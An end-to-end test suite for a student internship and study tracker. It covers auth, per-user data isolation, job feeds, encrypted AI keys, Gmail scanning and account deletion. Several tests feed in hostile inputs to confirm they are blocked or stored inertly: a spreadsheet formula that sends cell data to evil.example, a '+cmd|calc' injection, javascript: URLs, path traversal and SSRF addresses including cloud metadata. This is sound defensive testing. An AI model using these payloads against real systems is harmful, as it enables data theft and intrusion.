/**
 * End-to-end tests through the real HTTP handler: auth, RPC, real Postgres
 * (PGlite) with row-level security, and fixture responses for every outside
 * service. Each boot() is a new user in a shared database.
 */
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import { setPersonalSeedForTests } from '../src/server/flags';
import { encryptText } from '../src/server/platform/crypto';
import { fixtureFetch, sampleInbox } from '../tools/fixtures.mjs';
import { boot, testDatabase, type FixtureFetch } from '../tools/harness';

beforeAll(async () => {
  await testDatabase();
}, 60_000);

afterEach(() => setPersonalSeedForTests(null));

const PROFILE = {
  name: 'Asha',
  degree: 'bachelors',
  gradYear: 2027,
  skills: ['Python', 'PyTorch', 'SQL'],
  targetRoles: ['Machine Learning', 'Data Science', 'Software Engineering'],
  locations: ['India', 'Remote'],
  workModes: ['remote'],
  needsSponsorship: false,
  resumeText: 'Built ML models in Python and PyTorch.',
  links: { github: '', linkedin: '', portfolio: '' },
};

const GOOD_KEY = 'AIzaGOOD-key-for-tests-00000000';

describe('sign-in and access', () => {
  it('creates the account on first call and seeds studies and exams', async () => {
    const s = await boot();
    const data = await s.ok('bootstrap');
    expect(data.user.email).toBe(s.email);
    expect(data.user.isAdmin).toBe(false);
    expect(data.jobs).toEqual([]);
    expect(data.settings.onboarded).toBe(false);
    expect(data.settings.secrets).toEqual({ gemini: false, openai_compat: false });
    expect(data.programs.length).toBeGreaterThan(100);
    expect(data.exams.length).toBeGreaterThan(20);
    expect(data.features.mail).toBe(true);
    expect(data.gmail).toBeNull();
    const [profile] = await s.sql('select email from public.profiles where user_id = $1', [s.userId]);
    expect(profile).toEqual({ email: s.email });
  });

  it('rejects missing and invalid tokens', async () => {
    const s = await boot();
    const none = await s.request('/', { method: 'POST', body: JSON.stringify({ method: 'bootstrap', args: [] }) });
    expect(none.status).toBe(401);
    expect((await s.callAs('test:nope', 'bootstrap')).error?.code).toBe('UNAUTHENTICATED');
    expect((await s.call('dropDatabase')).error?.code).toBe('BAD_INPUT');
  });

  it('answers CORS preflights only for the app itself', async () => {
    const s = await boot();
    const good = await s.request('/', { method: 'OPTIONS', origin: 'https://app.example' });
    expect(good.status).toBe(204);
    expect(good.headers.get('access-control-allow-origin')).toBe('https://app.example');
    const evil = await s.request('/', { method: 'OPTIONS', origin: 'https://evil.example' });
    expect(evil.status).toBe(403);
    expect(evil.headers.get('access-control-allow-origin')).toBeNull();
  });

  it('keeps every student inside their own data', async () => {
    const a = await boot();
    const b = await boot();
    const { job } = await a.ok('createJob', { company: 'Acme', role: 'ML Intern', notes: 'private note' });
    expect((await b.call('getJob', job.id)).error?.code).toBe('NOT_FOUND');
    expect((await b.call('updateJob', job.id, { notes: 'hijack' })).error?.code).toBe('NOT_FOUND');
    expect((await b.ok('deleteJobs', [job.id])).deleted).toEqual([]);
    expect((await b.ok('listJobs')).jobs).toEqual([]);
    expect((await a.ok('getJob', job.id)).job.notes).toBe('private note');
  });

  it('reports configuration problems on /health without leaking secrets', async () => {
    const s = await boot();
    const ok = await s.request('/health');
    expect(ok.status).toBe(200);
    const broken = await boot({ env: { INTERNIQ_SECRETS_KEY: '' } });
    const res = await broken.request('/health');
    expect(res.status).toBe(500);
    const body = await res.json();
    expect(body.problems.join(' ')).toMatch(/INTERNIQ_SECRETS_KEY/);
    expect(JSON.stringify(body)).not.toContain('sb_secret_test');
  });
});

describe('refresh pipeline', () => {
  it('fetches, filters, scores and de-duplicates', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('saveSettings', { sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }, { ats: 'lever', token: 'missingco' }] } });
    const first = await s.ok('refreshNow');
    expect(first.report.added).toBeGreaterThan(20);
    expect(first.report.sources.find((x: any) => x.id === 'lever:missingco').error).toMatch(/404/);
    expect(first.report.sources.find((x: any) => x.id === 'greenhouse:northwind').added).toBeGreaterThan(0);
    const jobs = first.jobs as any[];
    expect(jobs.every((j) => j.match && j.match.method === 'local' && j.score >= 0)).toBe(true);
    expect(jobs.some((j) => /Senior Staff/.test(j.role))).toBe(false);
    expect(jobs.some((j) => /Account Executive/.test(j.role))).toBe(false);
    const again = await s.ok('refreshNow');
    expect(again.report.added).toBe(0);
    expect(again.report.duplicates).toBeGreaterThan(20);
    expect(again.jobs.length).toBe(jobs.length);
  });

  it('caps new postings per refresh and interleaves sources', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('saveSettings', { filters: { maxNewPerRefresh: 10 }, sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }] } });
    const r = await s.ok('refreshNow');
    expect(r.report.added).toBe(10);
    expect(r.jobs.some((j: any) => j.source === 'greenhouse')).toBe(true);
  });

  it('shares the big SimplifyJobs feed across students through the cache', async () => {
    const a = await boot();
    const b = await boot();
    await a.ok('saveProfile', PROFILE);
    await b.ok('saveProfile', PROFILE);
    await a.ok('refreshNow');
    const second = await b.ok('refreshNow');
    expect(a.state.fetched.filter((u) => /SimplifyJobs/.test(u))).toHaveLength(1);
    expect(b.state.fetched.filter((u) => /SimplifyJobs/.test(u))).toHaveLength(0);
    expect(second.report.added).toBeGreaterThan(20);
  });

  it('refuses to fetch private network addresses', async () => {
    const s = await boot();
    for (const url of ['http://localhost/admin', 'http://127.0.0.1:8080/', 'http://169.254.169.254/latest/meta-data', 'http://10.0.0.5/', 'http://[::1]/']) {
      const r = await s.call('addFromUrl', url);
      expect(r.ok).toBe(false);
    }
    expect(s.state.fetched.some((u) => /localhost|127\.0\.0\.1|169\.254|10\.0\.0\.5|::1/.test(u))).toBe(false);
  });
});

describe('jobs CRUD and safety', () => {
  it('stores text exactly as typed, including formula-like and NUL-laced text', async () => {
    const s = await boot();
    const evil = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
    const { job } = await s.ok('createJob', { company: evil, role: '+cmd|calc', notes: '@SUM(1)\u0000tail', location: '50%' });
    const listed = (await s.ok('listJobs')).jobs.find((j: any) => j.id === job.id);
    expect(listed.company).toBe(evil);
    expect(listed.notes).toBe('@SUM(1)tail');
    expect(listed.location).toBe('50%');
  });

  it('never queues AI work when no key is configured', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('saveSettings', { ai: { provider: 'gemini', autoMinScore: 0 } });
    const jobs = (await s.ok('refreshNow')).jobs as any[];
    expect(jobs.some((j) => j.aiStatus === 'queued')).toBe(false);
  });

  it('rejects duplicates, bad input and unknown fields', async () => {
    const s = await boot();
    await s.ok('createJob', { company: 'Acme', role: 'ML Intern', url: 'https://acme.example/1' });
    expect((await s.call('createJob', { company: 'ACME', role: 'ML Internship' })).error?.code).toBe('CONFLICT');
    expect((await s.call('createJob', { company: '', role: 'x' })).error?.code).toBe('BAD_INPUT');
    expect((await s.call('createJob', { company: 'A', role: 'B', url: 'javascript:alert(1)' })).error?.code).toBe('BAD_INPUT');
    const id = (await s.ok('listJobs')).jobs[0].id;
    expect((await s.call('updateJob', id, { score: 100 })).error?.code).toBe('BAD_INPUT');
    expect((await s.call('updateJob', id, { stage: 'hired' })).error?.code).toBe('BAD_INPUT');
    expect((await s.call('getJob', '../../etc')).error?.code).toBe('BAD_INPUT');
    expect((await s.call('getJob', 'j_000000000000')).error?.code).toBe('NOT_FOUND');
  });

  it('tracks stage changes, dates and notes', async () => {
    const s = await boot();
    const { job } = await s.ok('createJob', { company: 'Acme', role: 'Data Intern', description: 'SQL and Python' });
    const applied = (await s.ok('updateJob', job.id, { stage: 'applied', deadline: '2026-12-01', followUpAt: '2026-12-08', notes: 'Referral' })).job;
    expect(applied.stage).toBe('applied');
    expect(applied.appliedAt).not.toBe('');
    expect(applied.deadline).toBe('2026-12-01');
    expect((await s.call('updateJob', job.id, { deadline: 'next friday' })).error?.code).toBe('BAD_INPUT');
    const detail = await s.ok('getJob', job.id);
    expect(detail.job.description).toBe('SQL and Python');
    expect(detail.activity.some((a: any) => a.type === 'stage')).toBe(true);
  });

  it('bulk-updates and deletes, including emptying the list', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    const jobs = (await s.ok('refreshNow')).jobs as any[];
    const ids = jobs.slice(0, 15).map((j) => j.id);
    const bulk = await s.ok('bulkUpdate', ids, { stage: 'archived' });
    expect(bulk.jobs.every((j: any) => j.stage === 'archived')).toBe(true);
    expect((await s.ok('deleteJobs', ids)).deleted).toHaveLength(15);
    expect((await s.ok('listJobs')).jobs).toHaveLength(jobs.length - 15);
    const rest = (await s.ok('listJobs')).jobs.map((j: any) => j.id);
    expect((await s.ok('deleteJobs', rest)).deleted).toHaveLength(rest.length);
    expect((await s.ok('listJobs')).jobs).toHaveLength(0);
    const [{ n }] = await s.sql<{ n: number }>('select count(*)::int as n from public.job_texts where user_id = $1', [s.userId]);
    expect(n).toBe(0);
    expect((await s.ok('createJob', { company: 'After', role: 'Intern' })).job.company).toBe('After');
  });

  it('re-scores everything when the profile changes', async () => {
    const s = await boot();
    await s.ok('createJob', { company: 'Acme', role: 'Rust Systems Intern', description: 'Rust, Linux, distributed systems' });
    const before = (await s.ok('listJobs')).jobs[0].score;
    const after = (await s.ok('saveProfile', { ...PROFILE, skills: ['Rust', 'Linux', 'Distributed Systems'], targetRoles: ['Systems'] })).jobs[0].score;
    expect(after).toBeGreaterThan(before);
  });
});

describe('AI', () => {
  it('verifies keys before saving them, encrypts them, never exposes them', async () => {
    const s = await boot();
    expect((await s.call('setSecret', 'gemini', 'AIzaBAD-key-for-tests-000000')).error?.code).toBe('AI_NOT_CONFIGURED');
    expect(await s.sql('select * from public.user_secrets where user_id = $1', [s.userId])).toEqual([]);
    const out = await s.ok('setSecret', 'gemini', GOOD_KEY);
    expect(out.settings.ai.provider).toBe('gemini');
    expect(out.settings.ai.model).toBe('gemini-flash-latest');
    const [row] = await s.sql<{ ciphertext: string }>('select ciphertext from public.user_secrets where user_id = $1', [s.userId]);
    expect(row!.ciphertext).toMatch(/^v1\./);
    expect(row!.ciphertext).not.toContain('AIzaGOOD');
    expect(JSON.stringify(await s.ok('bootstrap'))).not.toContain('AIzaGOOD');
    expect((await s.ok('bootstrap')).settings.secrets.gemini).toBe(true);
  });

  it('analyses in batches, sends the key in a header, and respects the daily limit', async () => {
    const seen: string[] = [];
    const s = await boot({
      fetchImpl: (req) => {
        if (/generativelanguage/.test(req.url)) {
          seen.push(req.url);
          expect(req.url).not.toContain('key=');
          expect(req.headers['x-goog-api-key']).toBe(GOOD_KEY);
        }
        return (fixtureFetch as FixtureFetch)(req);
      },
    });
    await s.ok('saveProfile', PROFILE);
    await s.ok('setSecret', 'gemini', GOOD_KEY);
    await s.ok('saveSettings', { ai: { autoAnalyze: false, dailyLimit: 2, batchSize: 5 } });
    const jobs = (await s.ok('refreshNow')).jobs as any[];
    const ids = jobs.slice(0, 5).map((j) => j.id);
    const out = await s.ok('analyzeWithAi', ids);
    expect(out.jobs.filter((j: any) => j.aiStatus === 'done')).toHaveLength(5);
    expect(out.jobs[0].match.method).toBe('ai');
    expect(out.usage.aiRequests).toBe(1);
    expect(seen.filter((u) => /generateContent/.test(u))).toHaveLength(1);
    await s.ok('analyzeWithAi', jobs.slice(5, 6).map((j) => j.id));
    expect((await s.call('analyzeWithAi', jobs.slice(6, 7).map((j) => j.id))).error?.code).toBe('AI_QUOTA');
  });

  it('backs off on provider quota errors without losing the job', async () => {
    const s = await boot({
      fetchImpl: (req) =>
        /:generateContent/.test(req.url)
          ? { status: 429, text: JSON.stringify({ error: { message: 'quota', details: [{ violations: [{ quotaId: 'GenerateRequestsPerDayPerProjectPerModel-FreeTier' }] }] } }) }
          : (fixtureFetch as FixtureFetch)(req),
    });
    await s.ok('setSecret', 'gemini', GOOD_KEY);
    const { job } = await s.ok('createJob', { company: 'Acme', role: 'ML Intern', description: 'Python' });
    const r = await s.ok('analyzeWithAi', [job.id]);
    expect(r.error).toMatch(/daily free quota/);
    expect(r.usage.cooldownUntil).not.toBe('');
    expect((await s.call('analyzeWithAi', [job.id])).error?.code).toBe('AI_QUOTA');
    expect((await s.ok('listJobs')).jobs[0].match.method).toBe('local');
  });

  it('auto-queues promising postings during refresh', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('setSecret', 'gemini', GOOD_KEY);
    await s.ok('saveSettings', { ai: { autoMinScore: 40, dailyLimit: 3 } });
    const r = await s.ok('refreshNow');
    expect(r.report.aiAnalyzed).toBeGreaterThan(0);
    expect(r.report.aiAnalyzed).toBeLessThanOrEqual(15);
    expect(r.usage.aiRequests).toBeLessThanOrEqual(3);
  });

  it('writes cover letters with AI or an honest template without it', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    const { job } = await s.ok('createJob', { company: 'Acme', role: 'ML Intern' });
    const local = await s.ok('generateCoverLetter', job.id, { tone: 'professional', length: 'short' });
    expect(local.method).toBe('local');
    expect(local.text).toContain('Dear Acme hiring team');
    await s.ok('setSecret', 'gemini', GOOD_KEY);
    const ai = await s.ok('generateCoverLetter', job.id, { tone: 'concise', length: 'short' });
    expect(ai.method).toBe('ai');
    expect((await s.ok('getJob', job.id)).coverLetter).toBe(ai.text);
  });
});

describe('background worker', () => {
  it('refreshes once a day at the chosen hour and then stays quiet', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC' } });
    const first = await s.runWorker();
    expect(first.did).toContain('refresh');
    expect((await s.ok('listJobs')).jobs.length).toBeGreaterThan(0);
    const fetches = s.state.fetched.length;
    const second = await s.runWorker();
    expect(second.did).not.toContain('refresh');
    expect(s.state.fetched.length).toBe(fetches);
  });

  it('only runs with the cron secret, and fans out to due users', async () => {
    const s = await boot();
    await s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC' } });
    const denied = await s.request('/cron', { method: 'POST', headers: { 'x-cron-secret': 'guess' }, body: '{}' });
    expect(denied.status).toBe(401);
    const res = await s.request('/cron', { method: 'POST', headers: { 'x-cron-secret': 'cron-secret-for-tests' }, body: '{}' });
    const body = await res.json();
    expect(body.dispatched).toBeGreaterThanOrEqual(1);
    expect(s.state.fetched.some((u) => u.endsWith('/functions/v1/api/cron'))).toBe(true);
  });
});

describe('limits and privacy', () => {
  it('rate-limits expensive calls per user', async () => {
    const s = await boot();
    for (let i = 0; i < 3; i++) await s.ok('refreshNow');
    expect((await s.call('refreshNow')).error?.code).toBe('RATE_LIMITED');
  });

  it('never leaks internals on unexpected errors', async () => {
    const s = await boot({
      wrapDb: (db) =>
        new Proxy(db, {
          get(target, prop, recv) {
            if (prop === 'select') return () => Promise.reject(new Error('secret stack detail at line 42'));
            return Reflect.get(target, prop, recv);
          },
        }),
    });
    const r = await s.call('listJobs');
    expect(r.ok).toBe(false);
    expect(r.error!.code).toBe('INTERNAL');
    expect(r.error!.message).not.toContain('secret stack');
  });

  it('exports everything and deletes the account on request', async () => {
    const s = await boot();
    await s.ok('saveProfile', PROFILE);
    await s.ok('setSecret', 'gemini', GOOD_KEY);
    await s.ok('createJob', { company: 'A', role: 'B', description: 'Desc' });
    const dump = await s.ok('exportData');
    expect(dump.jobs[0]).toMatchObject({ company: 'A', description: 'Desc' });
    expect(JSON.stringify(dump)).not.toContain('AIzaGOOD');
    expect((await s.call('deleteAccount', 'yes')).error?.code).toBe('BAD_INPUT');
    await s.ok('deleteAccount', 'DELETE');
    for (const t of ['profiles', 'jobs', 'job_texts', 'programs', 'user_kv', 'user_secrets', 'activity']) {
      const [{ n }] = await s.sql<{ n: number }>(`select count(*)::int as n from public.${t} where user_id = $1`, [s.userId]);
      expect(n, t).toBe(0);
    }
  });
});

describe('studies, exams and tasks', () => {
  it('seeds the catalogues once, then keeps user changes', async () => {
    const s = await boot();
    const data = await s.ok('bootstrap');
    const mbz = data.programs.find((p: any) => /MBZUAI/.test(p.name) && /Natural Language/.test(p.name));
    expect(mbz).toMatchObject({ deadline: '2026-12-15', funding: 'full', confirmed: true, stage: 'shortlisted', fit: '' });
    const ese = data.exams.find((x: any) => x.key === 'upsc-ese-2027');
    expect(ese.stage).toBe('dropped');
    const p = (await s.ok('updateProgram', mbz.id, { stage: 'preparing', docs: { sop: 'doing', lor: 'done', bogus: 'x' }, myNotes: 'Email Prof. X' })).program;
    expect(p.docs).toEqual({ sop: 'doing', lor: 'done' });
    const again = await s.ok('refreshCatalogs');
    expect(again.added).toBe(0);
    expect(again.programs.find((x: any) => x.id === mbz.id)).toMatchObject({ stage: 'preparing', myNotes: 'Email Prof. X' });
    expect((await s.ok('bootstrap')).programs.length).toBe(data.programs.length);
    const cse = data.exams.find((x: any) => x.key === 'upsc-cse-2027');
    expect((await s.ok('updateExam', cse.id, { stage: 'applied', applicationNo: 'OTR123' })).exam.stage).toBe('applied');
    expect((await s.call('updateExam', cse.id, { events: [] })).error?.code).toBe('BAD_INPUT');
    const own = (await s.ok('createExam', { name: 'State PSC', events: [{ label: 'Prelims', date: '2027-06-01' }] })).exam;
    expect(own.events).toEqual([{ label: 'Prelims', date: '2027-06-01', precision: 'day' }]);
  });

  it('manages tasks with dates and times', async () => {
    const s = await boot();
    const t = (await s.ok('createTask', { title: 'Book IELTS', due: '2026-11-21T10:00', area: 'studies' })).task;
    expect(t).toMatchObject({ due: '2026-11-21T10:00', allDay: false, area: 'studies', status: 'todo' });
    expect((await s.ok('updateTask', t.id, { status: 'done' })).task.status).toBe('done');
    expect((await s.call('createTask', { title: 'x', due: 'tomorrowish' })).error?.code).toBe('BAD_INPUT');
    expect((await s.call('createTask', { title: 'x', link: 'javascript:alert(1)' })).error?.code).toBe('BAD_INPUT');
    await s.ok('deleteTask', t.id);
    expect((await s.ok('bootstrap')).tasks).toHaveLength(0);
  });

  it('serves a private calendar feed for Google or Apple Calendar', async () => {
    const s = await boot();
    await s.ok('createTask', { title: 'Submit SOP draft', due: '2026-12-02', area: 'studies' });
    const { url } = await s.ok('calendarFeed');
    expect(url).toMatch(/\/functions\/v1\/api\/ics\/[A-Za-z0-9_-]{20,}\.ics$/);
    const res = await s.request(new URL(url).pathname.replace('/functions/v1/api', ''));
    expect(res.headers.get('content-type')).toMatch(/text\/calendar/);
    expect(await res.text()).toContain('Submit SOP draft');
    const rotated = await s.ok('calendarFeed', true);
    expect(rotated.url).not.toBe(url);
    expect((await s.request(new URL(url).pathname.replace('/functions/v1/api', ''))).status).toBe(404);
  });

  it("applies the owner's private seed to the owner only", async () => {
    setPersonalSeedForTests({
      version: 1,
      profile: { name: 'Seed User', skills: ['Python'], targetRoles: ['Machine Learning'] },
      ratings: { 'msc-natural-language-processing-mbzuai': { fit: 'top', note: 'Best fit' }, 'cactus-internship-max-planck-institutes': { fit: 'top', note: 'Strong' } },
      programStages: { 'msc-natural-language-processing-mbzuai': 'preparing' },
      tasks: [{ title: 'Book IELTS', due: '2026-11-21', area: 'studies' }],
    });
    const stranger = await boot();
    const theirs = await stranger.ok('bootstrap');
    expect(theirs.profile.name).toBe('');
    expect(theirs.tasks).toEqual([]);
    expect(theirs.jobs).toEqual([]);

    const owner = await boot({ email: 'owner@student.example' });
    const data = await owner.ok('bootstrap');
    expect(data.user.isAdmin).toBe(true);
    expect(data.profile.name).toBe('Seed User');
    expect(data.tasks.map((t: any) => t.title)).toEqual(['Book IELTS']);
    expect(data.programs.find((p: any) => p.key === 'msc-natural-language-processing-mbzuai')).toMatchObject({ fit: 'top', note: 'Best fit', stage: 'preparing' });
    const abroad = data.jobs.filter((j: any) => j.sourceLabel === 'Research internships abroad');
    expect(abroad.length).toBeGreaterThan(10);
    expect(abroad.find((j: any) => /CaCT/.test(j.role)).notes).toContain('Strong');
    const again = await owner.ok('bootstrap');
    expect(again.tasks).toHaveLength(1);
    expect(again.jobs.length).toBe(data.jobs.length);
  }, 60_000);
});

describe('owner dashboard', () => {
  it('shows numbers to the owner only, and can suspend an account', async () => {
    const student = await boot();
    await student.ok('bootstrap');
    expect((await student.call('adminOverview')).error?.code).toBe('FORBIDDEN');
    const owner = await boot({ email: 'owner@student.example' });
    const { overview } = await owner.ok('adminOverview');
    expect(overview.users).toBeGreaterThanOrEqual(2);
    expect(overview.recent.some((u: any) => u.email === student.email)).toBe(true);
    expect((await owner.call('adminSetBlocked', owner.userId, true)).error?.code).toBe('BAD_INPUT');
    await owner.ok('adminSetBlocked', student.userId, true);
    expect((await student.call('bootstrap')).error?.code).toBe('FORBIDDEN');
    await owner.ok('adminSetBlocked', student.userId, false);
    expect((await student.call('bootstrap')).ok).toBe(true);
  });
});

describe('Gmail', () => {
  it('connects with read-only consent and stores the token encrypted', async () => {
    const s = await boot();
    const { url } = await s.ok('connectGmail');
    const google = new URL(url);
    expect(google.origin).toBe('https://accounts.google.com');
    expect(google.searchParams.get('scope')).toBe('https://www.googleapis.com/auth/gmail.readonly');
    expect(google.searchParams.get('access_type')).toBe('offline');
    expect(google.searchParams.get('login_hint')).toBe(s.email);

    const forged = await s.request('/gmail/callback?code=good-code&state=forged.state');
    expect(forged.headers.get('location')).toMatch(/gmail=error/);

    const res = await s.connectGmail();
    expect(res.status).toBe(302);
    expect(res.headers.get('location')).toBe('https://app.example/interniq/#/mail?gmail=connected');
    const [row] = await s.sql<{ refresh_token_enc: string; status: string }>('select refresh_token_enc, status from public.gmail_connections where user_id = $1', [s.userId]);
    expect(row!.status).toBe('active');
    expect(row!.refresh_token_enc).not.toContain('refresh-test');
    const data = await s.ok('bootstrap');
    expect(data.gmail).toMatchObject({ email: s.email, status: 'active' });
    expect(data.settings.mail.enabled).toBe(true);
  });

  it('reads the inbox, tracks applications, adds tasks and filters noise', async () => {
    const inbox = sampleInbox();
    const s = await boot({ inbox: () => inbox });
    await s.connectGmail();
    await s.ok('createJob', { company: 'Kestrel Maps', role: 'Software Engineer Intern', stage: 'applied' });
    const out = await s.ok('scanMail');
    expect(out.report.added).toBe(inbox.length);
    const byCompany = Object.fromEntries(out.jobs.map((j: any) => [j.company, j]));
    expect(byCompany['Lumen Labs'].stage).toBe('interviewing');
    expect(byCompany['Kestrel Maps'].stage).toBe('interviewing');
    expect(byCompany['Northwind AI'].stage).toBe('saved');
    expect(byCompany['Sable Security']).toBeUndefined();
    const ignored = out.mail.filter((m: any) => m.status === 'ignored').map((m: any) => m.fromName);
    expect(ignored).toEqual(expect.arrayContaining(['LinkedIn Job Alerts', 'Internshala', 'Corizo']));
    const titles = out.tasks.map((t: any) => t.title);
    expect(titles.some((t: string) => /^Complete Lumen Labs assessment/.test(t))).toBe(true);
    expect(titles.some((t: string) => /^Interview: Kestrel Maps/.test(t))).toBe(true);
    expect(titles.some((t: string) => /^Register: Northwind AI/.test(t))).toBe(true);
    expect(out.tasks.find((t: any) => /Kestrel/.test(t.title)).allDay).toBe(false);
    expect(out.tasks.every((t: any) => t.link.startsWith('https://mail.google.com/mail/u/'))).toBe(true);
    const mbz = out.mail.find((m: any) => /MBZUAI/.test(m.subject));
    expect(mbz).toMatchObject({ area: 'studies', status: 'new' });

    const second = await s.ok('scanMail');
    expect(second.report.added).toBe(0);
    expect(second.tasks.length).toBe(out.tasks.length);

    const upsc = out.mail.find((m: any) => /upsc/.test(m.from));
    expect((await s.ok('mailAction', upsc.id, 'task')).task.area).toBe('exams');
    const sable = out.mail.find((m: any) => /Sable/.test(m.fromName));
    const tracked = await s.ok('mailAction', sable.id, 'apply-stage');
    expect(tracked.job.stage).toBe('rejected');
    expect((await s.ok('mailAction', mbz.id, 'ignore')).mail.status).toBe('ignored');
    expect((await s.call('mailAction', 'not-an-id!', 'done')).error?.code).toBe('BAD_INPUT');
  });

  it('scans hourly from the worker and handles revoked access', async () => {
    const inbox = sampleInbox();
    const s = await boot({ inbox: () => inbox });
    expect((await s.call('scanMail')).error?.message).toMatch(/Connect Gmail/);
    await s.connectGmail();
    const run = await s.runWorker();
    expect(run.did).toContain('mail');
    expect((await s.ok('bootstrap')).mail.length).toBe(inbox.length);

    // The student removes InternIQ in their Google account: the next scan says so.
    await s.sql(`update public.gmail_connections set refresh_token_enc = $2 where user_id = $1`, [s.userId, await encryptText(s.env.secretsKey, 'revoked')]);
    const r = await s.call('scanMail');
    expect(r.error?.message).toMatch(/Reconnect Gmail/);
    expect((await s.ok('bootstrap')).gmail.status).toBe('revoked');

    await s.ok('disconnectGmail');
    expect(s.state.revoked).toEqual(['revoked']);
    expect((await s.ok('bootstrap')).gmail).toBeNull();
  });

  it('reports a cancelled consent screen back to the app', async () => {
    const s = await boot();
    const { url } = await s.ok('connectGmail');
    const state = new URL(url).searchParams.get('state')!;
    const res = await s.request(`/gmail/callback?error=access_denied&state=${encodeURIComponent(state)}`);
    expect(decodeURIComponent(res.headers.get('location') ?? '')).toMatch(/gmail=error&reason=You cancelled/);
  });
});
